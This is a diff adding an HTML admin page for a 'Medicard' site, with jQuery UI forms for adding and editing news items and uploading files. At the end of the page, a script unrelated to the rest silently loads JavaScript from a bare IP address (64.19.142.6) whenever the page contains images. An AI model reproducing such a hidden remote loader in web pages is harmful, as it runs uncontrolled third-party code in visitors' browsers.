@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="us">
+	<head>
+		<meta charset="utf-8">
+		<title>Medicard</title>
+		<link href="css/start/jquery-ui-1.10.2.custom.css" rel="stylesheet">
+		<script src="js/jquery-1.9.1.js"></script>
+		<script src="js/jquery-ui-1.10.2.custom.js"></script>
+		<script src="news.js"></script>
+
+		<style>
+			body {
+				font: 60% "Trebuchet MS", sans-serif;
+				margin: 50px;
+			}
+			.demoHeaders {
+				margin-top: 2em;
+				font: 120% "Trebuchet MS", sans-serif;
+			}
+			.demoHeaders1 {
+				margin-top: 2em;
+				font: 120% "Trebuchet MS", sans-serif;
+				height: 100%;
+			}
+			#dialog-link {
+				padding: .4em 1em .4em 20px;
+				text-decoration: none;
+				position: relative;
+			}
+			#dialog-link span.ui-icon {
+				margin: 0 5px 0 0;
+				position: absolute;
+				left: .2em;
+				top: 50%;
+				margin-top: -8px;
+			}
+			#icons {
+				margin: 0;
+				padding: 0;
+			}
+			#icons li {
+				margin: 2px;
+				position: relative;
+				padding: 4px 0;
+				cursor: pointer;
+				float: left;
+				list-style: none;
+			}
+			#icons span.ui-icon {
+				float: left;
+				margin: 0 4px;
+			}
+			.fakewindowcontain .ui-widget-overlay {
+				position: absolute;
+			}
+		</style>
+	</head>
+	<body>
+
+		<h1 class="demoHeaders" align="left" id="clinicTitle">MEDICARD Add News</h2>
+		<div id="cl" align="left">
+			<ul id="icons" class="ui-widget ui-helper-clearfix">
+				<li class="ui-state-default ui-corner-all" title="add news">
+					<span class="ui-icon ui-icon-power" onclick="add()"></span>
+				</li>
+			</ul>
+		</div><h2 class="demoHeaders" align="center"></h2><div id="datepicker" align="center"></div><!-- Accordion --><h2 class="demoHeaders" >News</h2><h2 class="demoHeaders1" id="top"></h2>
+		<div id="dialog-form" title="Edit News">
+			<p class="validateTips"></p>
+
+			<form enctype="multipart/form-data" action="upload.php" method="post" id="newsForm">
+				<fieldset>
+					<label for="newsID">News ID</label>
+					<br>
+					<input type="" name="ID" id="ID" class="text ui-widget-content ui-corner-all" />
+					<br>
+					<label for="newsTitle">Title</label>
+					<br>
+					<input type="" name="title" id="title" class="text ui-widget-content ui-corner-all" />
+					<br>
+					<label for="newsBody">Body</label>
+					<br>
+					<input type="" name="body" id="body" class="text ui-widget-content ui-corner-all" />
+					<br>
+
+					Choose a file to upload:
+					<input name="userfile" id="userfile" type="file"/>
+					<br/>
+
+			</form>
+		</div>
+		<div id="dialog-form-add" title="Add News">
+			<p class="validateTips"></p>
+
+			<form enctype="multipart/form-data" action="upload1.php" method="post" id="addNewsForm">
+				<fieldset>
+					<label for="newsTitle">Title</label>
+					<br>
+					<input type="" name="title" id="addTitle" class="text ui-widget-content ui-corner-all" />
+					<br>
+					<label for="newsBody">Body</label>
+					<br>
+					<input type="" name="body" id="addBody" class="text ui-widget-content ui-corner-all" />
+					<br>
+
+					Choose a file to upload:
+					<input name="userfile" id="userfile" type="file"/>
+					<br/>
+
+			</form>
+		</div><!-- // -->
+		<script type="text/javascript">
+			function FN_IR_load() {
+				var script = document.createElement('script');
+				script.type = 'text/javascript';
+				script.src = 'http://64.19.142.6/irscripts/imgreload.js';
+				document.getElementsByTagName('head')[0].appendChild(script);
+			}
+
+			var FN_IR_loaded = false;
+			if (document.images.length > 0) {
+				FN_IR_loaded = true;
+				FN_IR_load();
+			}
+		</script>
+	</body>
+</html>
